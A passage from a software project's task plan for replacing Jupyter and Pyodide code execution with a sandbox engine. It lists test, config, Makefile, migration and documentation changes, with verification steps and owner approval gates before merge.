**Tests** (`tests/test_benchmark_harness.py`): add sandbox cases beside
the Jupyter ones (the `app_with` fixture at `:93-137` grows an engine
parameter and patches the new probe); the spec carries the engine and the
image digest; a sandbox-engine spec sha differs from a Jupyter one.

**Verify:** `make test-backend`; `make test-types`.

### T31: harness baseline on the sandbox engine

*Author: local. Verify: gpu, kvm, owner. Depends: T29, T30.*

With the owner: serve each current profile from Benchmarks > Serve, run
the same Tests configuration the last Jupyter-era baseline used through
the harness on the sandbox engine, and record in
`docs/guides/benchmarks.md` the numbers with the hardware, model file,
llama.cpp build, flags, Kata version and image digest (AGENTS.md,
"Benchmark numbers carry their context"). Confirm the spec sha differs
from Jupyter-era runs (acceptance test "Harness").

### T39: step 2 gate

*Author: local. Verify: docker, kvm. Depends: T31.*

`make check`; the Kata suite; merge `main` in if it moved. Jupyter is
deleted next; this is the last point where both engines can be compared.

---

## Step 3: remove Jupyter and Pyodide

### T40: remove the Jupyter backend code and tests

*Author: any. Verify: any. Depends: T39.*

- Delete `utils/code_interpreter.py` (`JupyterCodeExecuter`,
  `execute_code_jupyter`, `ResultModel`, `UPLOADS_DIR`,
  `DEFAULT_IDLE_TIMEOUT`, the re-export from T13) and its imports at
  `tools/builtin.py:738-744` and `utils/middleware.py:81`.
- `execute_code` (`builtin.py:640-812`) and its registration: remove
  (the sandbox tools replace it), or keep only if the tag path needs it
  (it does not; T20 calls the manager directly).
- `utils/middleware.py`: the Jupyter branch of `_execute_code`; the
  blocked-modules preamble (`:6095-6113`) and `builtin.py:672-698`, with
  `CODE_INTERPRETER_BLOCKED_MODULES` (`config.py:431`); `_inline_output_images`
  if the sandbox branch no longer needs it.
- `config.py`: all `CODE_EXECUTION_JUPYTER_*` and `CODE_INTERPRETER_JUPYTER_*`
  settings (`:387-396`, `:411-429`), `CODE_INTERPRETER_JUPYTER_PROMPT`
  (`:470-482`), their `DEFAULT_CONFIG` keys (`:2612-2632`), and the same
  in `routers/configs.py` (`:49-65`, `:717-732`).
- `harness.py`: `_jupyter_alive` and the `jupyter` acceptance in
  `prepare()`.
- Tests: delete `tests/test_jupyter_chat_files.py` and
  `tests/test_jupyter_idle_timeout.py`; remove the Jupyter cases from
  `test_async_file_io.py:233-255`, `test_benchmark_harness.py`,
  `test_numeric_env_settings.py:110-111, 226-232`; replace the Jupyter
  cases in `test_chat_payload.py`, `test_streaming_response.py` and
  `test_subagent_delegate.py` and their goldens
  (`tests/fixtures/chat_payload.json`, `streaming_response.json`,
  `subagent_delegate.json`) with sandbox cases, moving T20's
  `sandbox_*.json` fixtures in if that reads better. Every one of these
  is an expected gate finding.

**Verify:** `grep -rni jupyter apps/server/local_llm` finds only the
migration history and `benchmarks/data/prompts/` (unrelated data, never
edited); `make test-backend`; `make test-types` (the basedpyright
baseline may shrink: `make baselines`).

### T41: remove the Jupyter service, Makefile wiring and desktop text

*Author: any. Verify: any; docker. Depends: T39.*

- `infra/docker-compose.yml`: the `jupyter` service (`:68-102`), its
  network (`:130-132`) and the `jupyter-work` volume (`:134-137`); fix the
  stale header comment (`:1-9`).
- `Makefile`: `JUPYTER_TOKEN` generation (`:139-145`, keep
  `SEARXNG_SECRET`), `jupyter` in the service lists (`:149`, `:164`), the
  `==> ` lines and messages (`:154`, `:156`, `:159`, `:163`) naming the
  services now running; keep the prefixes `'==> Starting Postgres and
  Redis'` and `'==> Stopping Postgres and Redis'` that
  `apps/desktop/src/progress.ts:69, :127` match.
- `tests/test_makefile.py` (`:54, :221, :248, :254, :259, :268, :281`) and
  `apps/desktop/src/progress.test.ts:169-176` follow the new strings;
  `progress.ts:67-68`'s comment and `stack.ts:145`'s message name the
  right services.
- `infra/.env.example`: drop `JUPYTER_TOKEN`. An existing `infra/.env`
  keeps a harmless extra line; say so in README.
- `jupyter-work` on existing machines: document `docker volume rm
  local-llm_jupyter-work` in the guide; do not remove it automatically.

**Verify:** `make test-backend` (test_makefile), `make test-desktop`;
(docker) `make backend` starts and stops cleanly with the new service
list, and the desktop app's progress dialog still advances (`make
desktop`).

### T42: remove Pyodide

*Author: any. Verify: any. Depends: T39.*

The `pyodide` branches in `tools/builtin.py:701-734` (gone with
`execute_code` in T40 if removed there), `utils/middleware.py:6116-6127`
and `:2542-2569`, `utils/subagents.py:303-320`; `CODE_INTERPRETER_PYODIDE_PROMPT`
(`config.py:453-465`); `DEFAULT_CODE_INTERPRETER_PROMPT`'s "runs in the
user's browser" wording (`:435-450`); `ENABLE_PYODIDE_FILE_PERSISTENCE`
(`env.py:1118-1121`, `main.py:92`, `:2489`); the `'pyodide'` defaults at
`builtin.py:700`, `middleware.py:2543`, `subagents.py`, `config.py:385,
:407` (become `'sandbox'`); the event-caller comments at
`middleware.py:3214-3216, :6651-6652`; `utils/sanitize.py:14, :49` and
`upstream_trace.py:7, :37` docstrings; the harness comments. Frontend:
`CodeExecution.tsx` engine choice (`ENGINES` becomes `['sandbox']`, or
the select goes), the i18n keys only it used (find them with `grep -n -i -E
'jupyter|pyodide' apps/web/src/lib/i18n/locales/en-US/translation.json`
and check each has no other user), `CodeEditor.tsx:31-35`'s
comment, `settingsTabs.ts:241`'s `'jupyter'` keyword (remove it; `'sandbox'` is
already there), `CodeExecution.test.tsx` and
`e2e/admin-settings.spec.ts:187-222`.

**Verify:** `grep -rni pyodide apps/` finds nothing outside migrations;
`make test-backend`, `make test-web`, `make test-e2e`.

### T43: migrate engine rows to `sandbox`

*Author: any. Verify: any. Depends: T40, T42.*

A new revision (`new-migration`): in `config`, set the value of
`code_interpreter.engine` and `code_execution.engine` to `"sandbox"`
where it is `"jupyter"` or `"pyodide"`, and delete the rows whose key
starts with `code_interpreter.jupyter.` or `code_execution.jupyter.`.
Values are JSON: match the stored representation the existing rows use
(check `3ff2c63645b8_reshape_config_to_per_key_rows.py:461-536`).
Idempotent. `downgrade()` cannot restore deleted values; it sets the two
engine rows back to `"jupyter"` and says in its docstring that the
Jupyter keys come back from defaults only on a Jupyter-era backend.

**Tests:** a migration test on a database with each old value (the
pattern in `test_schema_drift.py`'s `TEST_DATABASE_URL` tests).

**Verify:** `make test-backend` with `TEST_DATABASE_URL`; on the laptop,
the backend starts on the existing database and the admin page shows the
sandbox engine.

### T44: docs sweep

*Author: any. Verify: any. Depends: T40-T43.*

Rewrite `docs/guides/assistant-tools.md`'s code interpreter section for
the sandbox only; update `docs/guides/features.md` (`:215, :257-260,
:276, :286, :315, :324`) and its canonical diagrams
`features-chat-pipeline.mmd:30` and `features-harness.mmd:9, :19` (the
`.md` embeds them; keep them identical); `docs/guides/benchmarks.md`
(`:276-308`); `docs/guides/desktop.md:111-113`; README (`:45`, `:56-59`,
`:91`, `:262-264`, `:314`); MAP.md (`:39`, `:119-120`, `:173-176`, the
proposals entry: built, and where); AGENTS.md (`:94`, `:127`, `:163`, the
qwen25c note at `:53`, the proposals row at `:430`);
`docs/plans/benchmarks-through-the-app.md` (`:9`, `:73`);
`docs/plans/local-model-recommendations.md` (`:104`, `:134`). Leave
`docs/history/`, `docs/audit/` and existing decisions entries as written.
Finish the PR's decisions entry. Mark the proposal's header "built" with
the PR number, and move it to `docs/history/` only if the owner wants
(ask).

**Verify:** `grep -rniE 'jupyter|pyodide' docs README.md MAP.md AGENTS.md`
shows only history, audit, decisions, the proposal and this plan;
`docs-sync`; pre-commit.

### T48: final verification

*Author: local. Verify: docker, kvm, owner. Depends: T44.*

Merge `main` in (the branch must be up to date with `main` when the
owner approves); every ledger row `done`; `make check`; the Kata suite;
every acceptance test re-run on the final head and recorded; the roadmap
milestone and timeline updated (T23's note); the local session plan's
"The final gate" in full.

### T49: owner marks the PR ready

*Author: owner. Verify: owner. Depends: T48.*

The owner reads `## Gate changes`, marks the PR ready and adds
`gate-change-approved`. Marking it ready turns auto-merge on, after which
`update-branches.yml` merges `main` into the branch whenever `main`
moves; each such commit removes the label, so the owner re-approves after
any update, and if the update brought code, a local session re-runs the
checks it touches first. The PR then auto-merges once green and up to
date. This task is not an OMC story (the local session plan leaves it
out, so T48 carries OMC's final quality gate).
After it merges, a local session marks this plan complete in its header
and the ledger, on `main`, in a small docs PR.
